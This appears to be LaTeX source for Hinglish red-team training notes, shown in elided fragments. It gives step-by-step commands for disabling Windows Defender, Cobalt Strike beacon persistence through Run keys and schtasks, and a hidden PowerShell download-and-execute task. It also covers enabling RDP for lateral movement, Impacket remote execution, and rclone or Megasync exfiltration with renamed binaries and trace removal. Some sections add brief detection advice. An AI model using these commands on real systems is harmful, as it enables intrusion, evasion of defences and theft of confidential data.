  \item Fix Karo: Run as Administrator 
  (right-click \texttt{CMD} > Run as admin), 
  ya UAC disable (registry se).\\
  Agar denied mile, elevated shell le lo 
  (e.g., \texttt{psexec}).\textsuperscript{[2]}
\end{itemize}
          \end{itemize}
        ...
        \begin{itemize}
  \item Registry se Defender ko permanently disable kar sakte ho – 
  yeh evasion ke liye better hai kyunki reboot pe bhi off rahega.\\
  Key: \texttt{HKEY\_LOCAL\_MACHINE\textbackslash{}SOFTWARE\textbackslash{}Policies\textbackslash{}Microsoft\textbackslash{}Windows Defender}\textsuperscript{[3]}
\end{itemize}

        \item \textcolor{red}{\textbf{Note:}} Command:
          \begin{tcolorbox}[codebox]
reg add "HKLM\textbackslash{}SOFTWARE\textbackslash{}Policies\textbackslash{}Microsoft\textbackslash{}Windows Defender" /v DisableAntiSpyware /t REG \_DWORD /d 1 /f
\end{tcolorbox}
       ...
       \begin{itemize}
  \item Real-time monitoring Defender ka core part hai jo files scan karta hai.\\
  Isko disable karne se ongoing protection off hota hai.\\
  Key: \texttt{HKEY\_LOCAL\_MACHINE\textbackslash{}SOFTWARE\textbackslash{}Policies\textbackslash{}Microsoft\textbackslash{}Windows Defender\ \\
  textbackslash{}Real-Time Protection}\textsuperscript{[3]}
\end{itemize}
            ...
            \item Verify Karo:
              \begin{itemize}
                ...
                \item Command:
                  ...
                  \end{tcolorbox}
                  \begin{itemize}
  \item Agar \texttt{SERVICE\_NAME: WinDefend} nahi mile 
  ya service stopped ho, toh Defender disable ho chuka hai — success.

  \item Test karo: EICAR test virus file banao.\\
  Agar scan nahi hota, toh Defender real-time protection disabled hai.\textsuperscript{[4]}
\end{itemize}
              \end{itemize}
        ...
        \item Step 2: Team Server Start Karo (Control Center)
          \begin{enumerate}
            ...
            \item Command:
              \begin{tcolorbox}[codebox]
                \begin{tcolorbox}[codebox]
./teamserver <your\_Kali\_IP> <password> [optional\_malleable\_profile] [kill\_date]
\end{tcolorbox}
              – e.g.,
              \begin{tcolorbox}[codebox]
      ...
      \begin{enumerate}[leftmargin=*]
        ...
        \item Why Best (Advantages):
          \begin{itemize}
            \item \textcolor{red}{\textbf{Note:}} Native aur Trusted: Windows ka built-in tool hai (C:\textbackslash Windows\textbackslash System32 \\
            \textbackslash bitsadmin.exe), signed by Microsoft – AV/EDR isko suspicious nahi maante (jaise third-party tools ko karte hain). Yeh LOLBin (Living Off the Land Binary) hai, jo evasion ke liye perfect.
      ...
      \begin{enumerate}[leftmargin=*]
        ...
        \begin{itemize}
  \item What It Contains/How It Works: 
  Timestamps NTFS ke \texttt{\$MFT} (Master File Table) mein store hote hain –\\
  \texttt{\$STANDARD\_INFORMATION} (SI) aur \texttt{\$FILE\_NAME} (FN) attributes mein.\\
  Attacker inko modify karta hai taaki:
\end{itemize}
          \begin{itemize}
...
. .\textbackslash{}temp.ps1  # Execute (dot sourcing)
...
\end{tcolorbox}
      ...
      \begin{enumerate}[leftmargin=*]
        \begin{itemize}
  \item Yeh tactic mein, tu Cobalt Strike ke payload 
  (e.g., \texttt{beacon.exe} ya DLL) ko Windows registry ke Run keys mein add karta hai\\
  taaki woh user login ya system boot par automatically execute ho jaaye.

  Run keys registry locations hain 
  (\texttt{HKEY\_CURRENT\_USER} ya \texttt{HKEY\_LOCAL\_MACHINE})\\
  jahaan Windows startup programs list karta hai – jaise antivirus ya updates.

  Cobalt Strike payload add karne se, tu persistence achieve karta hai:\\
  System reboot hone pe bhi beacon (C2 agent) run hota rahega, 
  attacker ko continuous access milega.\textsuperscript{[2][4][6][1]}
\end{itemize}

        \item What It Contains/How It Works: Registry Run keys (e.g., HKCU\textbackslash Software\textbackslash Microsoft \\
        \textbackslash Windows\textbackslash CurrentVersion\textbackslash Run) string values store karte hain jo executables ke paths point karte hain. Jab user logs in, Windows inko load karta hai. Cobalt Strike mein, tu beacon payload generate karta hai, usko target pe place karta hai, phir registry mein entry daal deta hai taaki auto-start ho. Yeh user-level (HKCU – current user) ya system-level (HKLM – all users) ho sakta hai.[4][1][2]
          ...
          \begin{enumerate}
            ...
            \item Run Key Mein Entry Add Karo (Manual Command): PowerShell ya CMD se registry modify karo.
              \begin{itemize}
                \item Command:
                  \begin{tcolorbox}[codebox]
reg add HKCU\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}Run 
/v MyUpdate 
/t REG\_SZ 
/d "C:\textbackslash{}Temp\textbackslash{}beacon.exe" 
/f
\end{tcolorbox}
      ...
      \begin{enumerate}[leftmargin=*]
        \item Startup folder Windows ka built-in feature hai jo programs ko allow karta hai ki woh user login ya system boot par automatically start ho jaayein. Yeh OS ke core part hai, jahaan shortcuts (.lnk files) ya executables daal do, toh woh run ho jaate hain. Location do types ke hote hain:
          \begin{itemize}
            \item Per-User Startup Folder: C:\textbackslash Users\textbackslash<Username>\textbackslash AppData\textbackslash Roaming\textbackslash \\
            Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup (tune jo diya, yeh sahi hai – user-specific, sirf us user ke login par run hota hai).
        ...
        \item How to Do This Attack Step-by-Step (As Done by Red Teamers):
          \begin{enumerate}
            ...
            \item Startup Folder Locate Karo: Path confirm karo – per-user: C:\textbackslash Users \\
            \textbackslash<Username>\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\
            \\
            textbackslash Startup (hidden hota hai, File Explorer mein ``Show hidden files'' on karo). All-users ke liye admin access chahiye: C:\textbackslash ProgramData\textbackslash Microsoft\
            \\
            textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup.
      ...
      \begin{enumerate}[leftmargin=*]
        ...
        \item Your Commands Ka Full Breakdown (What It Is, Where/When to Use, and All Explained):
          \begin{enumerate}
            \item \texttt{schtasks /create /ru system /sc onlogon /tn "ajay" /tr "c:/windows \\
            /system32/notepad.exe"}
              ...
              \end{itemize}
            \item \texttt{schtasks /create /tn "task name" /tr "c:/windows/syswow64 \\
            /windowspowershell/v1.0/powershell.exe -windowstyle hidden -nologo -noninteractive -ep bypass -nop -c IEX (new-object net.webclient) \\
            .downloadString('http://192.168.235/malware.ps1')" /sc onlogon /ru system}
              \begin{itemize}
              ...
              \end{itemize}
            \item \texttt{schtasks /create /sc minute /mo 1 /tn 'task name' /tr "c:/windows/ \\
            system32/notepad.exe"}
              \begin{itemize}
...
\end{lstlisting}
      ...
      \lstset{
        ...
        commentstyle=\color{green},
        morecomment=[l][\color{magenta}]{\#},
        morekeywords={reg,netsh,net,psexec,wmiexec,atexec,smbexec,secretsdump,kerberosrelayx},
        breaklines=true,
        frame=none
      }
      ...
      \textcolor{blue}{\huge\bfseries Topic--RDP Enabled via Registry}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} RDP Windows ka built-in protocol hai jiski madad se remote machine ke desktop ko control kar sakte hain network ke through.
        \item Basically tu apni machine se doosri machine pe login kar ke usko control kar sakta hai jaise saamne baithe ho.
        \item System administrators ke liye tool to remotely manage karne ka, red teamers ke liye lateral movement ka powerful channel.
        \item \textbf{Note:} \textcolor{red}{Note:} Windows environment mein RDP stable, reliable, aur mostly enabled hota hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Jab attacker ek machine pe access le le, next step lateral movement ke liye RDP enable karke doosri machines control karna chahe.
        \item \textbf{Note:} \textcolor{red}{Note:} Why not Anydesk/TeamViewer?
          \begin{itemize}
            \item Anydesk, TeamViewer third-party apps hain, jinhe install karna padta hai, dependent on user configs.
            \item RDP native, usually pre-installed aur well logged hota hai.
            \item Network admins RDP monitoring mundane rakhte hain, anomali detect karne mein use karte hain.
            \item RDP zyada reliable enterprise environments ke liye.
          \end{itemize}
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
          Is command se tu Windows server me remote desktop connections enable karta hai.
          \begin{itemize}
            \item \textbf{fDenyTSConnections} = 0 means RDP allow hai, 1 means disabled.
            \item \texttt{/f} mean force overwrite without prompt.
          \end{itemize}
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
          Ye Windows Firewall me \textbf{WMI (Windows Management Instrumentation)} rule group ko enable karta hai.
          \begin{itemize}
            \item WMI laterally machines manage karne, information collect karne aur execute karne me important hota hai.
            \item Firewall block hone pe WMI use karna mushkil hota hai, to firewall rule open karna hota hai.
          \end{itemize}
        \item Initial Access Le Lo Low-Privilege Shell Se
        \item Pehle command chala ke RDP enable karo:
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
\end{lstlisting}
          \end{tcolorbox}
        \item Firewall block agar ho to enable karo:
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
\end{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
        \item Ab attacker RDP se konekt kar sakta hai aur lateral move kar sakta hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Registry value fDenyTSConnections monitor karo.
        \item \textbf{Note:} \textcolor{red}{Note:} Firewall rules change logs check karo.
        \item \textbf{Note:} \textcolor{red}{Note:} RDP login events aur group add/remove activities alert karo.
        \item \textbf{Note:} \textcolor{red}{Note:} MFA laga ke unauthorized RDP traffic ko mitigate karo.
      \end{enumerate}

      \begin{longtable}{|p{6cm}|p{3.5cm}|p{4cm}|}
        \hline
        \textbf{Command} & \textbf{Purpose} & \textbf{Red Team Use Case} \\
        \hline
        \texttt{reg add ... fDenyTSConnections /d 0} & RDP enable karta hai & Lateral movement ke liye RDP acceso \\
        \texttt{netsh advfirewall firewall set rule group="wmi" enable=yes} & WMI firewall rules ko open karta hai & Remote management aur reconnaissance \\
        \texttt{net localgroup "Remote Desktop Users" <user> /add} & User ko RDP group mein add karta hai & Authorized access enable karta hai \\
        \hline
      \end{longtable}

      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, yeh sab commands red team ke lateral movement arsenal mein important hai. Practice kar, samajh ke use kar, aur agar aur details chahiye toh baata!
        \item Stay sharp and keep hacking! ��
      \end{enumerate}

      \textcolor{blue}{\huge\bfseries Topic--RDP Enable via Registry}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} RDP Windows ka native protocol hai jiski madad se tu remotely kisi system ka desktop access kar sakta hai.
        \item Yeh system admins ke liye handy tool hai, aur red teamers lateral movement ke liye use karte hain.
        \item RDP remote system ko full control deta hai network ke through.
        \item Agar tere paas initial shell hai ek machine pe, aur tu doosri machine pe bhi access chahata hai, toh RDP enable kar ke easy access milta hai.
        \item Anydesk ya TeamViewer third-party apps hain, jo install ya run karna padta hai; RDP usually pre-installed hota hai aur stable enterprise mein zyada hota hai.
        \item RDP zyada reliable, audit log deta hai aur existing network policies ke andar hota hai.
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
\end{lstlisting}
          \end{tcolorbox}
          Linux ke Terminal Server key mein value \textbf{fDenyTSConnections} hoti hai.
          \begin{itemize}
            \item Agar isko 0 set karoge, toh RDP connections allow ho jayenge (enable RDP).
            \item 1 matlab disable.
            \item \texttt{/f} matlab force overwrite bina prompt ke.
          \end{itemize}
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
          Windows Firewall mein WMI related rule group ko enable karta hai.
          \begin{itemize}
            \item WMI remote system info gather karne, commands chalane me use hota hai.
            \item Agar firewall block kare to WMI commands nahi chalenge, isliye isse enable karna padta hai.
          \end{itemize}
        \item \textbf{Initial shell} milte hi registry se RDP enable kar dete hain.
        \item \textbf{Firewall WMI rules} enable kar ke full management access dete hain.
        \item User ko remotely "Remote Desktop Users" group mein daal dete hain (optional).
        \item Phir RDP session se next machines pe lateral move karte hain.
        \item RDP enable/disable registry values ka monitoring.
        \item Firewall rule changes par alert.
        \item RDP login attempts monitor karo.
        \item MFA lagao RDP pe.
      \end{enumerate}

      \begin{longtable}{|p{4cm}|p{3cm}|p{3cm}|}
        \hline
        \textbf{Command} & \textbf{Purpose} & \textbf{Use Case} \\
        \hline
        ...
        net localgroup remote desktop users add & User ko RDP group mein add karta & Access dene ke liye \\
        \hline
      \end{longtable}

      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, yeh puri clarity thi RDP enablement aur firewall configuration ki as a red teamer. Lab mein try kar, doubt aaye comment karna. Keep hacking! ��
      \end{enumerate}

      \textcolor{blue}{\huge\bfseries Topic--System Firewall Modify kar ke RDP Connections Allow Karna}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} Windows Firewall default system ports and programs ko block karta hai, including \textbf{Remote Desktop Protocol (RDP) ka port 3389}.
        \item \textbf{Note:} \textcolor{red}{Note:} RDP allow karne ke liye firewall rule enable karna zaroori hota hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Netsh advfirewall ek command line tool hai jisse tu firewall rules ko add, modify, ya delete kar sakta hai.
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
          \begin{itemize}
            \item \texttt{netsh advfirewall firewall add rule}
              \begin{itemize}
                \item Firewall me naya rule add karna.
              \end{itemize}
            \item \texttt{name="rdp"}
              \begin{itemize}
                \item Is rule ka naam rakha “rdp” (tu kuch bhi rakh sakta hai).
              \end{itemize}
            \item \texttt{dir=in}
              \begin{itemize}
                \item Incoming (inbound) traffic ko allow karegi.
              \end{itemize}
            \item \texttt{protocol=tcp}
              \begin{itemize}
                \item TCP protocol port ke liye (RDP TCP 3389 pe chalta hai).
              \end{itemize}
            \item \texttt{localport=3389}
              \begin{itemize}
                \item Jo port open karwana hai, yaha RDP ka standard port 3389.
              \end{itemize}
            \item \texttt{action=allow}
              \begin{itemize}
                \item Firewall ko allow karne ka instruction.
              \end{itemize}
          \end{itemize}
        \item \textbf{Note:} \textcolor{red}{Note:} Jab unka shell hota hai target system pe aur RDP off hota hai, wo RDP enable karte hain lateral movement ke liye.
        \item \textbf{Note:} \textcolor{red}{Note:} Firewall ko update karke RDP port open kar dete hain taaki wo directly ya kisi aur tool ke zariye remote desktop se connect kar saken.
        \item \textbf{Note:} \textcolor{red}{Note:} Yeh method stealthy nahi hota lekin fast and effective hai jab target network me firewalls actively ports block karte ho.
        \item Pehle check karo kya RDP open hai ya nahi:
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
        \item Remote desktop service check karo aur enable karo agar disabled:
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -Value 0
\end{lstlisting}
          \end{tcolorbox}
        \item Ab RDP client (mstsc) se target machine pe login karke lateral movement karo.
        \item \textbf{Note:} \textcolor{red}{Note:} Firewall me unnecessary open ports ko monitor karo.
        \item \textbf{Note:} \textcolor{red}{Note:} RDP sessions ke abnormal connection attempts pe alert karo.
        \item \textbf{Note:} \textcolor{red}{Note:} RDP ke liye MFA implement karo.
        \item \textbf{Note:} \textcolor{red}{Note:} Firewall rules logs and changes monitor karna essential hai.
        \item Agar multiple remote management tools hain (TeamViewer, Anydesk), phir bhi RDP enable karna useful hota hai structured enterprise environments me.
        \item Firewall rules ko group basis pe bhi enable/disable kar sakte ho, jaise:
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
      ...
      \begin{longtable}{|p{5cm}|p{3.5cm}|p{4cm}|}
        \hline
        \textbf{Command/Concept} & \textbf{Usage} & \textbf{Red Team Use Case} \\
        \hline
        \texttt{netsh advfirewall firewall add rule ...} & Firewall me RDP port open karna & Lateral movement aur remote connection \\
        RDP service enable via registry & Enable RDP service on target & Remote access setup \\
        Firewall rule group enable & Group ke liye multiple rules enable karna & Bulk firewall policy change \\
        \hline
      \end{longtable}

      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, ye thi tujhe \textbf{RDP port ka firewall se open karne ki method} red team ke viewpoint se, stepwise aur badi saaf safaai se. Lab pe kar ke dekh aur agar aur detail ya dusra topic chahiye toh bolna.
        \item Stay sharp! ��
      \end{enumerate}

      \textcolor{blue}{\huge\bfseries Topic--Lateral Movement through Impacket}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Impacket} ek open-source Python toolkit hai jo network protocols ko implement karta hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Red teamers ise network pe \textbf{lateral movement}, \textbf{credential access}, aur \textbf{remote execution} ke liye use karte hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Yeh SMB, MSRPC, Kerberos, and many other Windows protocols ko support karta hai, jisse aasan ho jata hai Windows networks pe move karna.
        \item \textbf{Note:} \textcolor{red}{Note:} Bahut powerful and popular toolset hai pentesters aur red teamers ke liye.
        \item \textbf{Note:} \textcolor{red}{Note:} Domain ya enterprise network mein jab initial foothold mil jaata hai, toh lateral movement karna hota hai next machines pe.
        \item \textbf{Note:} \textcolor{red}{Note:} Impacket se direct SMB protocol ko manipulate karke files copy karna, commands remotely run karna possible hai.
        \item Credential reuse, pass-the-hash, delegate attacks karna bhi hota hai easily.
        \item Tu bina graphical tools ke command line se kaam kar sakta hai automation scripts ke through.
        \item \textbf{Remote Command Execution:}
          \begin{itemize}
            \item Impacket ka \texttt{psexec.py} ya \texttt{wmiexec.py} se remotely command trigger karta hai.
          \end{itemize}
        \item \textbf{File Transfer:}
          \begin{itemize}
            \item Files ko SMB share par copy karna.
          \end{itemize}
        \item \textbf{SMB Sessions Establish} kar lateral machines pe authenticated rehna.
        \item \textbf{Kerberos Ticket Manipulation \& Relay:}
          \begin{itemize}
            \item Impacket tools se relay ya spoof Kerberos tickets karke lateral move karna.
          \end{itemize}
        \item \textbf{Password Dump \& Hash Replay:}
          \begin{itemize}
            \item Impacket se extracted creds se pass-the-hash attacks chalana.
          \end{itemize}
      \end{enumerate}
      ...
      \begin{longtable}{|p{4cm}|p{8cm}|}
        ...
        \hline
        \texttt{psexec.py} & Remote command execution with credentials \\
        \texttt{wmiexec.py} & Lightweight remote command execution via WMI \\
        \texttt{atexec.py} & Execute commands as a scheduled task \\
        \texttt{smbexec.py} & Similar to psexec but uses SMB execution \\
        \texttt{secretsdump.py} & Dump local and domain credentials \\
        \texttt{kerberosrelayx.py} & Relay Kerberos tickets to access resources \\
        \hline
      \end{longtable}

      \begin{enumerate}[itemsep=1em, resume]
        \item Credentials Milna
          \begin{itemize}
            \item Initial shell pe login credentials/chaiye (username, password/NTLM hash).
          \end{itemize}
        \item Target Host Identify Karna
          \begin{itemize}
            \item Network scan karo ya list banalo jahan lateral move karna hai.
          \end{itemize}
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
          Credentials ke zariye remote shell milega.
        \item Remote machine pe payload deploy kar sakte ho.
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
        ...
        \item \textbf{Note:} \textcolor{red}{Note:} Native Windows protocols pe direct work karta hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Lightweight, command line based, easily automated.
        \item \textbf{Note:} \textcolor{red}{Note:} Kam noise produce karta hai graphical tools ke mukable.
        \item \textbf{Note:} \textcolor{red}{Note:} Open-source, customizable.
        \item \textbf{Note:} \textcolor{red}{Note:} Wide toolset jo kai tarah ke attacks cover karta hai.
        \item \textbf{Note:} \textcolor{red}{Note:} SMB traffic monitor karo suspicious file copies ya executions.
        \item \textbf{Note:} \textcolor{red}{Note:} Unusual remote admin commands pe alert setup karo.
        \item \textbf{Note:} \textcolor{red}{Note:} Logon events ke anomalies track karo jab lateral movement suspect ho.
        \item \textbf{Note:} \textcolor{red}{Note:} Network segmentation aur admin account controls tighten karo.
        \item Bro summary yehi hai ki Impacket red team ka ek \textbf{Swiss Army knife} hai lateral movement ke liye — ek hi tool se multiple post-exploitation kaam easily ho jaate hain, aur stealth maintain hoti hai.
      \end{enumerate}
      ...
      \lstset{
        ...
        commentstyle=\color{green},
        morecomment=[l][\color{magenta}]{\#},
        morekeywords={rclone,psexec,wmiexec},
        breaklines=true,
        frame=none
      }
      ...
      \textcolor{blue}{\huge\bfseries Topic--Investigating and Incident Response (IR) Plan for Lateral Movement}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} Lateral movement matlab attacker ya red team ek compromised system se network mein doosri systems pe move karte hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Goal hota hai zyada systems access karna, data exfiltrate karna, ya final target tak pahunchna.
        \item \textbf{Note:} \textcolor{red}{Note:} Attack phase jahan attacker apni foothold expand karta hai.
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Detect Karna:}
          \begin{itemize}
            \item Suspicious logins across systems (especially remote logins RDP, SMB).
            \item New or unusual process creation (e.g., psexec, wmiexec).
            \item Multiple failed login attempts (bruteforce or spray).
            \item Network traffic monitoring for lateral protocols (SMB, RPC, WMI calls).
            \item Unusual account privilege changes.
          \end{itemize}
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Identify Scope:}
          \begin{itemize}
            \item Kaunse systems compromise hue?
            \item Kaunse users involved?
            \item Attack vector aur TTPs analyze karo.
          \end{itemize}
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Containment:}
          \begin{itemize}
            \item Affected accounts disable kar do.
            \item Network segmentation aur isolation karo traced machines.
            \item Credentials reset karo.
          \end{itemize}
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Eradication:}
          \begin{itemize}
            \item Malware, tools remove karo.
            \item Persistent backdoors hunt karo.
          \end{itemize}
        \item IDS/IPS alert ya SOC me red flags milte hi entry karo.
        \item Basic info collect karo: affected hosts, users, timeframe.
        \item Authentication logs (Windows Event ID 4624, 4625).
        \item Process creation logs (Sysmon Event 1).
        \item Network connection logs.
        \item Firewall, proxy logs.
        \item Search lateral movement tools/process names like \texttt{psexec.exe}, \texttt{wmiexec.exe} etc.
        \item Analyze unusual access behavior and remote connections.
        \item Map attack path aur infected assets.
        \item Confirm compromised credentials/users.
        \item Disable compromised accounts.
        \item Block ports \& protocols in firewall (3389 RDP etc.) to stop spreading.
        \item Disconnect affected hosts if severe.
        \item Remove malware and backdoors.
        \item Patch vulnerabilities exploited.
        \item Credential resets across the domain.
        \item Root cause analysis karo.
        \item Improve detection rules \& preventive policies.
        \item Train staff \& update IR playbooks.
        \item \textbf{Note:} \textcolor{red}{Note:} Lateral movement identify hone ke tools aur analytics samjhte hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Apne attack ko stealthy aur harder to detect banate hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Detection evade karne ke liye tools (like Impacket, Cobalt Strike) aur known TTPs ka reuse karte hain.
        \item \textbf{Note:} \textcolor{red}{Note:} IR plan samajh ke weaknesses dhoondhte hain jisse blue team ko overcome kar saken.
      \end{enumerate}

      \begin{longtable}{|p{4cm}|p{5cm}|p{5cm}|}
        \hline
        \textbf{Phase} & \textbf{Blue Team Actions} & \textbf{Red Team Intent} \\
        \hline
      ...
      \textcolor{blue}{\huge\bfseries Topic--Red + Blue Team Operation: Exfiltration of Confidential Info}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} Exfiltration ka matlab hai \textbf{sensitive ya confidential data ko unauthorized tareeke se system se bahar le jana}.
        \item \textbf{Note:} \textcolor{red}{Note:} Red teamers ise attack chain ke final stage mein use karte hain jab payloads, credentials, ya important documents ko bahar nikalna hota hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Goal hota hai data leakage, sabotage, ya proof of concept dikhana.
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Rclone} ek open-source command line tool hai jo cloud storage services (Google Drive, AWS S3, OneDrive, Dropbox, etc.) ke saath data synchronize, upload, download karta hai.
        \item Windows pe bhi easily chal sakta hai.
        \item Normally for legit file backup and sync.
        \item Attackers is tool ko apni malintent ki file exfiltration ke liye use karte hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Payloads se confidential files copy karte hain aur rclone ke commands se unhe attacker ke cloud storage par upload kar dete hain.
        \item Windows environment mein \texttt{rclone.exe} ko rename karke (jaise powershell.exe) use karke AV se bach sakte hain.
        \item Command line se stealthy aur automated upload hota hai.
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
rclone config
\end{lstlisting}
          \end{tcolorbox}
          Ye step one-time setup hota hai jisme tokens aur credentials stored hote hain.
        \item Rclone ko target machine par upload kar do (through payload ya manual).
        \item AV detection avoid karne ke liye rename kar do rclone.exe ko powershell.exe ya kisi aur dont-suspect name mein.
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
          Yaha \texttt{remote} wo configured cloud storage hai, \texttt{folder} destination location.
        \item Apne cloud storage mein file verify karo.
        \item Rclone ke logs check karo (agar hostile monitoring ho) aur traces remove karo.
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Backup" /t REG_SZ /d "\"C:\Windows\Temp\powershell.exe\" copy \"C:\secrets.txt\" remote:backup\" /f
\end{lstlisting}
          \end{tcolorbox}
          Ye registry run key bhi persistence ban sakti hai jo har reboot pe files chhupke upload karegi.
        \item \textbf{Note:} \textcolor{red}{Note:} Monitor unusual cloud storage traffic.
        \item \textbf{Note:} \textcolor{red}{Note:} Suspicious process renaming (powershell.exe agar abnormal path par ho).
        \item \textbf{Note:} \textcolor{red}{Note:} Endpoint monitoring for rclone or similar tools.
        \item \textbf{Note:} \textcolor{red}{Note:} Network proxy logs ke through cloud exfil attempts detect karo.
      \end{enumerate}

      \begin{longtable}{|p{4cm}|p{5cm}|p{5cm}|}
        \hline
        \textbf{Step} & \textbf{Command/Action} & \textbf{Comments} \\
        \hline
        Setup remote & \texttt{rclone config} & One-time cloud auth setup \\
        Copy rclone to target & Upload payload or manual & Often renamed for evasion \\
        Exfiltration command & \texttt{rclone copy <file> remote:<folder>} & File upload to attacker cloud \\
      ...
      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, yeh tha tera complete \textbf{Exfiltration ka execution plan using rclone} — red team ki nazar se. Lab mein fully test kar, safely practice kar. Aur koi help chahiye toh batana.
        \item Keep grinding! ��
        \item References: Various pentesting blogs, official rclone docs, red team toolkits
      \end{enumerate}

      \textcolor{blue}{\huge\bfseries Topic--Exfiltration through Third-Party Tools}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} Jab attacker apna custom tool ya scripting use karne ke bajaye \textbf{pre-installed ya third-party sync tools} use karta hai sensitive data ko secretly cloud pe bhejne ke liye.
        \item Examples: \textbf{Megasync (Mega.nz), Dropbox, Google Drive clients} ya koi aur cloud sync apps.
        \item Yeh popular hai kyunki ye apps already trusted (signed), network egress allowed hote hain aur detection kam hoti hai.
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Avoid Detection:} Native tools ya payloads easy detect ho jate hain par trusted cloud sync apps ka traffic mostly ignore hota hai AV/EDR sensors dwara.
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Fast \& Reliable:} Ye apps parallel file sync karte hain efficiently.
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Encrypted Cloud Storage:} Attacker ka data safe rehta hai.
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Persistence:} Automatic background synchronization ho sakta hai.
        \item Target machine me third-party cloud sync app already install hai ya attacker khud install karta hai apna account ke sath configured.
        \item Important files (exfiltration worthy) jaise credential dumps, documents, screenshots ko specific cloud sync folder me move karo. (e.g., \texttt{C:\textbackslash Users\textbackslash <user>\textbackslash MegaSync})
        \item Cloud sync app apne aap files ko cloud storage me upload kar dega automatically.
        \item Attacker remotely cloud storage account pe login karke files retrieve kar sakta hai.
        \item Megasync pre-installed ya attacker ne install kiya.
        \item Attacker ne ek \textbf{exfil folder} banaya jaha selectors sensitive files copy karta hai.
        \item Megasync background mein automatically ye files upload kar deta hai Mega cloud pe.
        \item Attacker Jab chahe locally ya remotely data access kar sakta hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Rename executables ya configure startup folder pe place karo for stealth.
        \item \textbf{Note:} \textcolor{red}{Note:} Use encrypted containers inside sync folders for added privacy.
        \item \textbf{Note:} \textcolor{red}{Note:} Clean local copies after successful sync to reduce footprint.
        \item \textbf{Note:} \textcolor{red}{Note:} Monitor sync logs for troubleshooting.
        \item \textbf{Note:} \textcolor{red}{Note:} Network traffic me unusual cloud sync detection.
        \item \textbf{Note:} \textcolor{red}{Note:} Identify unknown accounts linked to sync apps.
        \item \textbf{Note:} \textcolor{red}{Note:} Endpoint security tools ko cloud sync client activities monitor karne do.
        \item \textbf{Note:} \textcolor{red}{Note:} Block unknown or unauthorized cloud sync applications in enterprise.
      \end{enumerate}

      \begin{longtable}{|p{4cm}|p{5cm}|p{5cm}|}
        \hline
        \textbf{Step} & \textbf{Description} & \textbf{Red Team Usage} \\
        \hline
      ...
      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, ye tha tera \textbf{Third Party Cloud Sync Tools se Data Exfiltration ka pura funda} — kaise setup karna, use karna aur red team mein exploit karna.
        \item Lab mein try kar, aur full stealth techniques add kar. Agar koi question ho toh push dena!
        \item Keep grinding, champion! ��
